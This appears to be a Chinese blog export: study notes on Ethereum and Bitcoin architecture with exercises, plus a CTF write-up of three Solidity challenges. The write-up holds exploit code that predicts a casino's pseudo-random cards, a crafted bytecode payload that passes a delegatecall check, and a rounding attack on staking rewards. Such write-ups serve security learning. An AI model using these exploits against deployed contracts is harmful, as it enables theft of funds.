存档节点存储了所有全节点保存的内容，同时创建了历史状态的档案，存档节点不参与竞争出块权的共识计算，一般只提供状态查询服务，例如，如果要查询一个账户在以太坊区块高度1000000时的以太币余额，就要查询一个存档节点。\n节点发现管理节点连接管理​    以太坊网络的节点连接涉及到Peer（对等节点）、Session（会话）、Capability（能力）等基本概念。\n  (1) Peer：在以太坊系统的P2P网络中，Peer与节点（Node）是不同层次的对象，节点更底层，在NodeTable中进行管理，Peer是建立TCP连接会话的对象。\n  (2) Session：在以太坊系统的P2P网络中，Session是节点连接管理中最重要的结构，Session表示Peer之间真正建立了连接后的逻辑关系。\n  (3) Capability：指节点能支持的功能，表示以太坊系统在P2P网络通信层之上的业务能力，P2P网络只提供节点之间的连接通道，具体要传输什么数据，由节点支持的Capability决定，此外，由于以太坊系统经过多次升级，不同节点上安装运行的以太坊系统版本可能不同，为了实现系统向后兼容，节点连接时需要确定都可以支持的Capability集合。\n交易广播在以太坊系统的P2P网络中，交易的广播过程如下：\n  (1) 每个节点会针对每个邻近节点维护一个待发送交易列表TxsA和已知交易列表TxsB；\n  (2) 当节点接收到一个新交易Tx时，会先查询哪些邻近节点没有该交易信息，并将交易Tx加入邻近节点对应的待发送交易列表TxsA中；\n  (3) 节点向每个待发送交易列表TxsA不为空的节点异步发送交易；\n  (4) 交易发送成功后，会将被发出的交易加入对应邻近节点的已知交易列表TxsB。\n交易池以太坊系统也有交易池机制，交易池中的交易信息来源主要包括：\n  (1)本地提交：通过第三方应用调用以太坊网络节点本地的RPC服务提交的交易。\n  (2)广播同步：通过交易广播与同步，将其它节点的交易数据同步到该节点交易池。\n注意：当节点在竞争计算出块权时，会从交易池中获取并验证数条交易信息打包到区块中，如果节点成功获得出块权，新区块会被广播，此时新区块中包含的交易信息不会马上从交易池中删除，直到新区块被以太坊系统区块链确认，新区块中包含的交易才会从交易池中删除。如果以太坊系统的区块链发生了分叉，写进分叉的区块中包含的交易也不会从交易池中删除，而是继续在交易池中等待重新打包。\n区块广播与同步(1) 节点A假如连接了n个节点，从相邻节点中选出sqrt(n)个节点广播包含完整区块信息的消息，向剩余的sqrt(n)个节点只广播区块哈希的消息；\n(2) 收到到节点A广播的完整区块信息的节点，会将收到的区块加入等待验证的区块队列；\n(3) 收到节点A广播的区块哈希的节点，根据需要可以从发送给它消息的节点A那里获取对应的完整区块，获取区块后再加入到等待验证的区块队列；\n(4) 等待验证的区块队列中的区块经过验证确认后，最终插入节点本地区块链，节点再将新区块哈希广播给与它相连但还不知道该新区块的节点。\n以太坊系统共识层PoW工作量证明共识机制以太坊采用了Ethash算法作为其工作量证明算法。Ethash算法具有与算力大小和内存容量均相关的特性。\nPoS共识机制每一轮记账权由当时具有最高权益值的节点获得，最高权益值的计算并不仅仅依赖于节点算力的高低\n以太坊系统激励层(1) 加密货币总量无限制：以太坊系统并没有规定以太币的供应上限。\n(2) 出块激励：以太坊系统没有出块奖励减半机制，以太坊系统上线之初每个新区块的出块奖励为5个以太币。在以太坊系统第三个阶段（大都会阶段），出块奖励调整过两次：2017年10月的拜占庭升级，出块奖励由5个以太币降为3个；2019年3月的君士坦丁堡升级，出块奖励由3个以太币降为2个；未来以太坊的出块奖励可能还会继续调整。\n(3) 叔块激励：为了提高系统的交易性能，以太坊系统把出块时间缩短到平均10秒左右，更短的出块时间意味着在同一时刻，可能出现多个节点都求解出难题获得了新区块的记账权，但是在这些新区块中，只有一个将成为最长链上的区块，而其它区块，如果能被后续区块引用，将被称为叔块。\n(4) 交易激励：在以太坊系统中，每一次交易的执行都需要消耗一定的费用，这个费用被命名为“燃料（Gas）”，Gas的值并不直接使用以太币ETH表示，而是使用GWei作为单位，\n  例如：8 GWei &#x3D; 0.000000008 ETH\n   在以太坊系统的交易数据中有Gas的单价（Price）与需要消耗的Gas数量（GasLimit）属性，交易费用的计算公式如下：\n   交易费 &#x3D; Gas的单价 × 消耗的Gas数量\n   在以太坊系统中，交易可分为转账类型与智能合约相关类型，每一笔转账类型的交易，无论转账数额大小，系统规定最少消耗21000个 Gas数量，如果要在交易中额外添加备注信息，需要消耗额外的 Gas数量。\nl叔块机制以太坊系统合约层智能合约机制以太坊智能合约是一种采用Solidity语言开发的程序，经过编译的合约程序，只能通过以太坊合约账户以交易的形式发布到区块链上，交易信息中将附带合约程序的全部二进制字节码数据，并被打包保存到区块中，因此利用区块链的特性，智能合约一旦发布，合约的签订方就不可能被篡改或抵赖。\n以太坊系统合约层提供对智能合约的全生命周期管理，包括合约的创建、合约的部署运行、合约的调用执行、合约的作废。\n课后（一）填空题\n1. 在以太坊系统中，每个区块由      、     和      三部分组成。\n2. 以太币的标准单位是      ，最小单位是      ，1个标准单位的以太币等于       个最小单位的以太币。\n3. 以太坊网络中存在      、       、      等不同类型的节点，其中      节点所需的存储空间最大。\n4. 在以太坊系统中，账户分为       和       两类。\n5. 在以太坊系统中，创建智能合约类型交易的交易接收方地址值为      。\n6. 以太坊智能合约的全生命周期包括      、      、      和合约的作废。\n（二）选择题\n1. 在以太坊系统区块链的每个区块中不包含（   ）的哈希值。\nA. 父区块      B. 交易树根      C. 子区块       D. 收据树根\n2. 以太坊系统采用（   ）模型构建分布式账本，即每个用户都有直接的余额信息。\nA. UTXO      B. 账户       C. 数据库       D. 会计\n3. 以太坊系统是使用（   ）作为账户的唯一索引标识。\nA. 地址      B. 伪随机数     C. 账户编号      D. 随机数\n4. 在以太坊系统中，用于保存用户拥有的以太币余额的账户是（   ）。\nA. 合约账户    B. 外部账户     C. 普通账户      D. 交易账户\n5. 在以太坊系统中，交易可以分为多种类型，下面不属于以太坊交易类型的是（   ）。\nA. 转账支付    B. 创建合约     C. 创建账户      D. 调用合约\n6. 以太坊系统采用的共识机制主要依赖节点的（    ）进行出块权的竞争计算。**\nA. 算力      B. 内存容量     C. 算力+内存容量   D. 网络带宽\n7. 以太坊系统智能合约采用的系统默认开发语言是（    ）。\nA. Java       B. Go        C. Solidity       D. JavaScript\n8. 在以太坊系统中，一个创建合约类型的交易的接收方地址（Recipient）字段值应为（    ）。\nA.节点地址    B.空          C.外部账户地址     D.合约账户地址\n9. 以太坊系统除了正在使用的PoW共识机制外，计划在后续版本中支持（   ）共识机制。\nA. Paxos      B. PoS        C. DPoS        D. PBFT\n（三）简答题（任选3道）\n1. 请简述以太坊系统的区块链中各个区块是怎么链接的？\n2. 请简述以太坊系统的账户地址是怎样生成的？\n3. 请简单分析以太坊系统PoW共识机制节点竞争计算生成新区块的过程？\n4. 请简述为什么以太坊系统要引入叔区块（UncleBlock）机制？\n5. 请简单分析以太坊系统的账户与与传统的中心化系统的账户具有的不同之处？\n6. 请简述以太坊系统PoW共识机制采用的Ethash算法的主要计算过程？\n","url":"2024/12/11/链原——以太坊系统/","date":"2024-12-11"},{"title":"记一次题解03","content":"4.Casino_BLACKJACK题12345678910111213141516171819202122232425262728293031323334// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./casino.sol&quot;;contract Exploit &#123;    using Deck for *;    Casino public casino;    fallback() external payable &#123;&#125;    receive() external payable &#123;&#125;    constructor(Casino _casino) &#123;        casino = _casino;    &#125;    function _calculateScore(uint8[] memory cards) internal pure returns (uint8, uint8) &#123;        uint8 score = 0;        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores        bool bigAceUsed = false;        for (uint256 i = 0; i &lt; cards.length; ++i) &#123;            uint8 card = cards[i];            if (Deck.isAce(card) &amp;&amp; !bigAceUsed) &#123;                // doesn&#x27;t make sense to use the second Ace as 11, because it leads to the losing                scoreBig += Deck.valueOf(card, true);                bigAceUsed = true;            &#125; else &#123;                scoreBig += Deck.valueOf(card, false);            &#125;            score += Deck.valueOf(card, false);        &#125;        return (score, scoreBig);    &#125;&#125;\n\n\n\n我的思路阅读代码 发现给player随机牌是通过block.number和block.timestamp生成的，但是这两参数不是随机的，是可以知晓的，也就是说这个“随机牌”不随机哈\n经常玩黑杰克的朋友都知道，要想自己手中牌接近21点且不爆，就需要合理的要牌停牌，在我们知道其他player的随机牌后 就可以根据这个“合理”的要牌停牌了。再看得分规则，和传统黑杰克相似，\n除了赔付规则变成：\n123456789101112131415161718if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) &#123;//等于21\t\t\t\tif(game.playerCards.length == 2 &amp;&amp; (Deck.isTen(ga\\me.playerCards[0]) || Deck.isTen(game.playerCards[1]))) &#123;\t\t\t\t\tif(!payable(msg.sender).send((game.bet * 5) / 2)) revert();&#125;//始手牌为ace+10点，赔2.5倍else &#123;\t\t\t\t\tif(!payable(msg.sender).send(game.bet * 2)) revert();//&gt;2张所凑成的21，赔2倍\t\t\t\t&#125;\t\t\t\tgames[msg.sender].state = GameState.Player;\t\t\t\treturn;\t\t\t&#125; else &#123;\t\t\t\tif (playerScore &gt; BLACKJACK) &#123;\t\t\t\t\temit Log(1);\t\t\t\t\t//爆、直接负\t\t\t\t\tgames[msg.sender].state = GameState.House; \t\t\t\t\treturn;\t\t\t\t&#125;\n\n前面还有一个关于庄贤平局的说明\n1234567891011if (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) &#123;\t\t\tif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) &#123;\t\t\t\tif (!payable(msg.sender).send(game.bet)) revert();\t\t\t\tgames[msg.sender].state = GameState.Tie; \t\t\t\treturn;\t\t\t&#125; else &#123;\t\t\t\tgames[msg.sender].state = GameState.House;\t\t\t\treturn;\t\t\t&#125;\t\t\t//不知道有没有分牌平局 我没考虑这个\n\n 就是直接相等就平了（没有庄家大半点一说）\n直接返还双方本金\n那么如果我要赢：\n\n尽量拿到ace+10\n让庄家爆牌（庄家的牌我们是能知道的）\n\n思路：\n\n开始游戏Casino.deal()\n\n通过b.number和b.timestamp算下一张牌\n\n选择hit orstand\n\n直接让庄家爆牌\n\n\n获取庄家明牌:\n1uint8 houseCard = casino.getHouseCard(0);\n\n\n\n算牌:\n12345function predictCard(uint8 cardNumber) private view returns (uint8) &#123;        uint256 b = block.number;        uint256 timestamp = block.timestamp;        return uint8(uint256(keccak256(abi.encodePacked(blockhash(b), address(this), cardNumber, timestamp)) % 52);//一副牌去掉大小joker    &#125;\n\n\n\n计算下一张牌是否会让庄爆牌，会就让庄家摸牌\n123456789uint8 houseScore = getCardValue(houseCard);       uint8 nextCard = predictNextCard(3);        uint8 nextCardValue = getCardValue(nextCard);              if (houseScore + nextCardValue &gt; 21) &#123;           casino.stand(); // 庄家必须抽牌       &#125; else &#123;           casino.hit();       &#125;\n\n\n\n\n\n过程：\n 1.deploy Casino.sol\n得到addr:   \n0xC3Ba5050Ec45990f76474163c5bA673c244aaECA\n\ndeploy hacker.sol\n填入地址参数\n\n\n开始攻击\n(下注最小钱数)\n\n\n\n可以再写一个自动转钱\n123uint256 balance = address(this).balance;(bool success, ) = owner.call&#123;value: balance&#125;(&quot;&quot;);require(success, &quot;fail&quot;);\n\nforge test\n\n\n题解知识点 伪随机数解析：发牌过程在 Deck.deal() 函数内处理。发牌过程涉及计算 blockhash、玩家地址、已发牌数和 block.timestamp 的哈希。这是一个伪随机性，可以简单地通过等待所需的区块，根据新数据重新计算游戏结果。\n123456789101112131415161718//尝试获取一手得分为 21（即 Blackjack）的牌，如果成功，就调用 casino.deal&#123;value: 5 ether&#125;() 下注；否则，把攻击者发送的 msg.value 退回去，避免损失。function attack() public payable &#123;        uint8[] memory playerCards = new uint8[](2);//存储玩家的两张牌        playerCards[0] = Deck.deal(address(this), 0);        playerCards[1] = Deck.deal(address(this), 2);                (uint8 score, uint8 scoreBig) = _calculateScore(playerCards);//判断能否达到21        if (scoreBig == 21 || score == 21) &#123;            casino.deal&#123;value: 5 ether&#125;();            //调用 casino.deal()下注        &#125; else &#123;            payable(msg.sender).transfer(msg.value);            //如果不是21点就退款        &#125;    &#125;\n\n5. Dance题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract ByteDance &#123;    bool solved;    constructor() &#123;        solved = false;    &#125;    function checkCode(address _yourContract) public &#123;               require(!solved, &quot;Challenge already solved&quot;);        bytes memory code;        uint256 size;        bool hasDanceByte = false;        assembly &#123;            size := extcodesize(_yourContract)            code := mload(0x40)            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))            mstore(code, size)            extcodecopy(_yourContract, add(code, 0x20), 0, size)        &#125;        //上面的assemble就是将_yourContract的字节码复制到code        for (uint256 i = 0; i &lt; size; i++) &#123;            bytes1 b = code[i];            if (isByteDance(b)) &#123;                hasDanceByte = true;            &#125;            require(isOddByte(b), &quot;Byte is not odd&quot;);        &#125;        require(hasDanceByte, &quot;No palindrome byte found&quot;);        (bool success,) = _yourContract.delegatecall(&quot;&quot;);        require(success, &quot;Delegatecall failed&quot;);    &#125;    function isOddByte(bytes1 b) public pure returns (bool) &#123;        return (uint8(b) % 2) == 1;    &#125;    function isByteDance(bytes1 b) public pure returns (bool) &#123;        bool isPal = true;        assembly &#123;            let bVal := byte(0, b)            for &#123; let i := 0 &#125; lt(i, 4) &#123; i := add(i, 1) &#125;            &#123;                                let bitLeft := and(shr(sub(7, i), bVal), 0x01)                                let bitRight := and(shr(i, bVal), 0x01)                if iszero(eq(bitLeft, bitRight)) &#123;                                        isPal := 0                &#125;            &#125;        &#125;        return isPal;    &#125;    function isSolved() public view returns(bool)&#123;        return solved;    &#125;&#125;\n\n\n\n题解知识点：字节码问题 \n解析：只需要构建正确的字节码0x611101611111611111035561ff，以及理解字节码逻辑就可以完成解题。\n123456789contract expoliter &#123;//0x611101611111611111035561ff   解决    constructor() &#123;        bytes memory code = hex&#x27;611101611111611111035561ff&#x27;;        assembly &#123;                        return (add(code, 0x20), mload(code))         &#125;    &#125;&#125;\n\n\n\n6. stake题StakingReward合约用于为质押者分配奖励，你可以削减质押者应得的奖励吗？\n做题流程：\nremix\n\n部署setUp1合约 （部署题目）\n与第一步部署的合约交互\nisSolved()返回true时视为完成题目\n\nforge\n\n在try_exploit函数代码注释下补充的攻击流程\n运行forge test 测试test_solve通过视为完成题目\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.9;abstract contract ERC20 &#123;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );    mapping(address =&gt; uint256) private _balances;    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;    uint256 private _totalSupply;    string private _name;    string private _symbol;    uint8 private _decimals;    constructor(string memory name_, string memory symbol_, uint8 decimals_) &#123;        _name = name_;        _symbol = symbol_;        _decimals = decimals_;    &#125;    function name() public view virtual returns (string memory) &#123;        return _name;    &#125;    function symbol() public view virtual returns (string memory) &#123;        return _symbol;    &#125;    function decimals() public view virtual returns (uint8) &#123;        return _decimals;    &#125;    function totalSupply() public view virtual returns (uint256) &#123;        return _totalSupply;    &#125;    function balanceOf(address account) public view virtual returns (uint256) &#123;        return _balances[account];    &#125;    function transfer(address to, uint256 value) public virtual returns (bool) &#123;        address owner = msg.sender;        _transfer(owner, to, value);        return true;    &#125;    function allowance(        address owner,        address spender    ) public view virtual returns (uint256) &#123;        return _allowances[owner][spender];    &#125;    function approve(        address spender,        uint256 value    ) public virtual returns (bool) &#123;        address owner = msg.sender;        _approve(owner, spender, value);        return true;    &#125;    function transferFrom(        address from,        address to,        uint256 value    ) public virtual returns (bool) &#123;        address spender = msg.sender;        _spendAllowance(from, spender, value);        _transfer(from, to, value);        return true;    &#125;    function _transfer(address from, address to, uint256 value) internal &#123;        if (from == address(0)) &#123;            revert();        &#125;        if (to == address(0)) &#123;            revert();        &#125;        _update(from, to, value);    &#125;    function _update(address from, address to, uint256 value) internal virtual &#123;        if (from == address(0)) &#123;            // Overflow check required: The rest of the code assumes that totalSupply never overflows            _totalSupply += value;        &#125; else &#123;            uint256 fromBalance = _balances[from];            if (fromBalance &lt; value) &#123;                revert();            &#125;            unchecked &#123;                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.                _balances[from] = fromBalance - value;            &#125;        &#125;        if (to == address(0)) &#123;            unchecked &#123;                // Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.                _totalSupply -= value;            &#125;        &#125; else &#123;            unchecked &#123;                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.                _balances[to] += value;            &#125;        &#125;        emit Transfer(from, to, value);    &#125;    function _mint(address account, uint256 value) internal &#123;        if (account == address(0)) &#123;            revert();        &#125;        _update(address(0), account, value);    &#125;    function _burn(address account, uint256 value) internal &#123;        if (account == address(0)) &#123;            revert();        &#125;        _update(account, address(0), value);    &#125;    function _approve(address owner, address spender, uint256 value) internal &#123;        _approve(owner, spender, value, true);    &#125;    function _approve(        address owner,        address spender,        uint256 value,        bool emitEvent    ) internal virtual &#123;        if (owner == address(0)) &#123;            revert();        &#125;        if (spender == address(0)) &#123;            revert();        &#125;        _allowances[owner][spender] = value;        if (emitEvent) &#123;            emit Approval(owner, spender, value);        &#125;    &#125;    function _spendAllowance(        address owner,        address spender,        uint256 value    ) internal virtual &#123;        uint256 currentAllowance = allowance(owner, spender);        if (currentAllowance != type(uint256).max) &#123;            if (currentAllowance &lt; value) &#123;                revert();            &#125;            unchecked &#123;                _approve(owner, spender, currentAllowance - value, false);            &#125;        &#125;    &#125;&#125;contract SCTF is ERC20 &#123;    constructor(        address owner,        uint supply,        uint8 decimals    ) ERC20(&quot;SCTF&quot;, &quot;sctf&quot;, decimals) &#123;        _mint(owner, supply);    &#125;&#125;contract USDC is ERC20 &#123;    constructor(        address owner,        uint supply,        uint8 decimals    ) ERC20(&quot;USDC&quot;, &quot;usdc&quot;, decimals) &#123;        _mint(owner, supply);    &#125;&#125;contract StakingReward &#123;    struct Checkpoint &#123;        uint64 ts;        uint128 value;    &#125;    uint256 public block_timestamp;   // CONSTANTS/IMMUTABLES    uint256 public constant MIN_COOLDOWN_PERIOD = 1 days;    uint256 public constant MAX_COOLDOWN_PERIOD = 10 days;    ERC20 public immutable usdc;    ERC20 public immutable SCTF;   //state    mapping(address =&gt; Checkpoint[]) public balancesCheckpoints;    Checkpoint[] public totalSupplyCheckpoints;    uint256 public periodFinish;    uint256 public rewardsDuration;    uint256 public lastUpdateTime;    uint256 public cooldownPeriod;    address public owner;    mapping(address =&gt; uint256) public userLastStakeTime;    uint256 public rewardRateUSDC;    uint256 public rewardPerTokenStoredUSDC;    mapping(address =&gt; uint256) public userRewardPerTokenPaidUSDC;    mapping(address =&gt; uint256) public rewardsUSDC;   //auth       modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;Not Owner&quot;);        _;    &#125;    modifier afterCooldown(address _account) &#123;        _afterCooldown(_account);        _;    &#125;    function _afterCooldown(address _account) internal view &#123;        uint256 canUnstakeAt = userLastStakeTime[_account] + cooldownPeriod;        if (canUnstakeAt &gt; block_timestamp) revert();    &#125;   //CONSTRUCTOR / INITIALIZER    constructor(address _usdc, address sctf) &#123;        usdc = ERC20(_usdc);        SCTF = ERC20(sctf);        owner = msg.sender;        rewardsDuration = 5 days;        cooldownPeriod = 10 days;        block_timestamp = block.timestamp;    &#125;   //views    function totalSupply() public view returns (uint256) &#123;        uint256 length = totalSupplyCheckpoints.length;        unchecked &#123;            return length == 0 ? 0 : totalSupplyCheckpoints[length - 1].value;        &#125;    &#125;    function balanceOf(address _account) public view returns (uint256) &#123;        Checkpoint[] storage checkpoints = balancesCheckpoints[_account];        uint256 length = checkpoints.length;        unchecked &#123;            return length == 0 ? 0 : checkpoints[length - 1].value;        &#125;    &#125;   //STAKE/UNSTAKE    function stake(uint256 _amount) external updateReward(msg.sender) &#123;        if (_amount == 0) return;        // update state        userLastStakeTime[msg.sender] = block_timestamp;        _addTotalSupplyCheckpoint(totalSupply() + _amount);        _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) + _amount);        // transfer token to this contract from the caller        SCTF.transferFrom(msg.sender, address(this), _amount);    &#125;    function unstake(        uint256 _amount    ) public updateReward(msg.sender) afterCooldown(msg.sender) &#123;        if (_amount == 0) return;        uint256 balance = balanceOf(msg.sender);        if (_amount &gt; balance) revert();        _addTotalSupplyCheckpoint(totalSupply() - _amount);        _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) - _amount);        SCTF.transfer(msg.sender, _amount);    &#125;   //CLAIM REWARDS    function getReward() external &#123;        _getReward(msg.sender);    &#125;    function _getReward(address _account) internal &#123;        _getReward(_account, _account);    &#125;    function _getReward(        address _account,        address _to    ) internal updateReward(_account) &#123;        uint256 rewardUSDC = rewardsUSDC[_account];        if (rewardUSDC &gt; 0) &#123;            // update state (first)            rewardsUSDC[_account] = 0;            // transfer token from this contract to the account            // as newly issued rewards from inflation are now issued as non-escrowed            usdc.transfer(_to, rewardUSDC);        &#125;    &#125;   //REWARD UPDATE CALCULATIONS    /// @notice update reward state for the account and contract    /// @param _account: address of account which rewards are being updated for    /// @dev contract state not specific to an account will be updated also    modifier updateReward(address _account) &#123;        _updateReward(_account);        _;    &#125;    function _updateReward(address _account) internal &#123;        rewardPerTokenStoredUSDC = rewardPerTokenUSDC();        lastUpdateTime = lastTimeRewardApplicable();        if (_account != address(0)) &#123;            rewardsUSDC[_account] = earnedUSDC(_account);            userRewardPerTokenPaidUSDC[_account] = rewardPerTokenStoredUSDC;        &#125;    &#125;    function rewardPerTokenUSDC() public view returns (uint256) &#123;        uint256 allTokensStaked = totalSupply();        if (allTokensStaked == 0) &#123;            return rewardPerTokenStoredUSDC;        &#125;        return            rewardPerTokenStoredUSDC +            (((lastTimeRewardApplicable() - lastUpdateTime) *                rewardRateUSDC *                1e18) / allTokensStaked);    &#125;    function lastTimeRewardApplicable() public view returns (uint256) &#123;        return block_timestamp &lt; periodFinish ? block_timestamp : periodFinish;    &#125;    function earnedUSDC(address _account) public view returns (uint256) &#123;        uint256 totalBalance = balanceOf(_account);        return            ((totalBalance *                (rewardPerTokenUSDC() - userRewardPerTokenPaidUSDC[_account])) /                1e18) + rewardsUSDC[_account];    &#125;   //CHECKPOINTING VIEWS       function balancesCheckpointsLength(        address _account    ) external view returns (uint256) &#123;        return balancesCheckpoints[_account].length;    &#125;    function totalSupplyCheckpointsLength() external view returns (uint256) &#123;        return totalSupplyCheckpoints.length;    &#125;    function balanceAtTime(        address _account,        uint256 _timestamp    ) external view returns (uint256) &#123;        return            _checkpointBinarySearch(balancesCheckpoints[_account], _timestamp);    &#125;    function totalSupplyAtTime(        uint256 _timestamp    ) external view returns (uint256) &#123;        return _checkpointBinarySearch(totalSupplyCheckpoints, _timestamp);    &#125;    function _checkpointBinarySearch(        Checkpoint[] storage _checkpoints,        uint256 _timestamp    ) internal view returns (uint256) &#123;        uint256 length = _checkpoints.length;        if (length == 0) return 0;        uint256 min = 0;        uint256 max = length - 1;        if (_checkpoints[min].ts &gt; _timestamp) return 0;        if (_checkpoints[max].ts &lt;= _timestamp) return _checkpoints[max].value;        while (max &gt; min) &#123;            uint256 midpoint = (max + min + 1) / 2;            if (_checkpoints[midpoint].ts &lt;= _timestamp) min = midpoint;            else max = midpoint - 1;        &#125;        assert(min == max);        return _checkpoints[min].value;    &#125;//UPDATE CHECKPOINTS    function _addBalancesCheckpoint(address _account, uint256 _value) internal &#123;        _addCheckpoint(balancesCheckpoints[_account], _value);    &#125;    function _addTotalSupplyCheckpoint(uint256 _value) internal &#123;        _addCheckpoint(totalSupplyCheckpoints, _value);    &#125;    function _addCheckpoint(        Checkpoint[] storage checkpoints,        uint256 _value    ) internal &#123;        uint256 length = checkpoints.length;        uint256 lastTimestamp;        unchecked &#123;            lastTimestamp = length == 0 ? 0 : checkpoints[length - 1].ts;        &#125;        if (lastTimestamp != block_timestamp) &#123;            checkpoints.push(                Checkpoint(&#123;                    ts: uint64(block_timestamp),                    value: uint128(_value)                &#125;)            );        &#125; else &#123;            unchecked &#123;                checkpoints[length - 1].value = uint128(_value);            &#125;        &#125;    &#125; //settings    function notifyRewardAmount(        uint256 _rewardUsdc    ) external onlyOwner updateReward(address(0)) &#123;        if (block_timestamp &gt;= periodFinish) &#123;            rewardRateUSDC = _rewardUsdc / rewardsDuration;        &#125; else &#123;            uint256 remaining = periodFinish - block_timestamp;            uint256 leftoverUsdc = remaining * rewardRateUSDC;            rewardRateUSDC = (_rewardUsdc + leftoverUsdc) / rewardsDuration;        &#125;        lastUpdateTime = block_timestamp;        periodFinish = block_timestamp + rewardsDuration;    &#125;    function setRewardsDuration(uint256 _rewardsDuration) external onlyOwner &#123;        if (block_timestamp &lt;= periodFinish) revert();        if (_rewardsDuration == 0) revert();        rewardsDuration = _rewardsDuration;    &#125;    function setCooldownPeriod(uint256 _cooldownPeriod) external onlyOwner &#123;        if (_cooldownPeriod &lt; MIN_COOLDOWN_PERIOD) revert();        if (_cooldownPeriod &gt; MAX_COOLDOWN_PERIOD) &#123;            revert();        &#125;        cooldownPeriod = _cooldownPeriod;    &#125;    function vm_warp(uint256 warp) public &#123;        if (periodFinish != 0) &#123;            require(block_timestamp + warp &lt;= periodFinish, &quot;error time warp&quot;);        &#125;        block_timestamp += warp;    &#125;&#125;contract setUp1 &#123;    StakingReward public staking;    address public player;    SCTF public sctf;    USDC public usdc;    bool isClaimed;    constructor() &#123;        sctf = new SCTF(address(this), 120_000e18 + 10e18, 18);        usdc = new USDC(address(this), 1_00e6, 6);        staking = new StakingReward(address(usdc), address(sctf));        sctf.approve(address(staking), 120_000e18);        staking.stake(120_000e18);        staking.vm_warp(1);        usdc.transfer(address(staking), 100e6);        staking.notifyRewardAmount(100e6);    &#125;    function registerPlayer() public &#123;        require(staking.block_timestamp() != staking.periodFinish());        require(player == address(0), &quot;Already Registered&quot;);        player = msg.sender;        sctf.transfer(player, 10e18);    &#125;    function claimReward() public &#123;        require(staking.block_timestamp() == staking.periodFinish());        require(!isClaimed);        staking.getReward();        isClaimed = true;    &#125;    function isSolved() public view returns (bool) &#123;        if (            player != address(0) &amp;&amp;            isClaimed &amp;&amp;            (usdc.balanceOf(address(this)) &lt; 1e6)        ) &#123;            return true;        &#125;        return false;    &#125;&#125;\n\n\n\n题解知识点：舍入问题 \n解析：由于奖励代币USDC精度较小，仅有6位小数，并且总质押量大，因此在奖励计算时如果相隔时间小由于精度损失会让让 rewardPerTokenStoredUSDC不会增加，导致奖励代币被卡在合约中不能分发。\n因此只需要频繁调用合约中的函数来更新rewardPerTokenStoredUSDC就可完成题目\n","url":"2025/05/10/记一次题解03/","date":"2025-05-10"},{"title":"链原——比特币系统","content":"比特币区块链系统架构背景：比特币系统作为世界上第一个大规模成功运营的区块链系统，也建立了区块链系统体系结构的标准——P2P体系结构，即对等网络结构。\n\n每个节点都通过底层的P2P网络协议发现、连接其它区块链网络节点，并提供P2P网络的路由功能；\n\n个节点可以通过PoW共识机制竞争计算新区块的出块权（俗称“挖矿”）；\n\n每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听比特币网络上的交易信息，验证每个交易和区块的合法性\n\n\n关于节点节点总体上可以分为“全节点”、“轻节点”等两大类，其中发挥核心作用的是全节点。\n全节点\n全节点是比特币系统中功能最完整的节点，全节点一般要求保持一直在线，主要负责执行以下功能：\n\n参与区块记账权的竞争，通过PoW共识机制竞争下一个新区块的出块权，获得出块权的节点将获得系统激励，激励的方式就是奖励一定数量的比特币，也是比特币这种加密货币的唯一产生来源。\n\n存储完整的区块链与账本数据，每个全节点都保存了一个相同区块链与账本数据副本，自2009年比特币系统上线运行至今，每个全节点的区块链与账本数据存储容量已超过500GB。\n\n提供P2P网络路由与同步服务，监听系统网络上的交易、区块及事件信息，对接收到的交易和区块数据进行验证，并通过Gossip协议进行数据分发与同步。\n\n\n轻节点\n轻节点主要负责提供交易和钱包功能，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息，以及与节点自身相关的交易信息，可以发起简单支付验证请求SPV（Simplified Payment 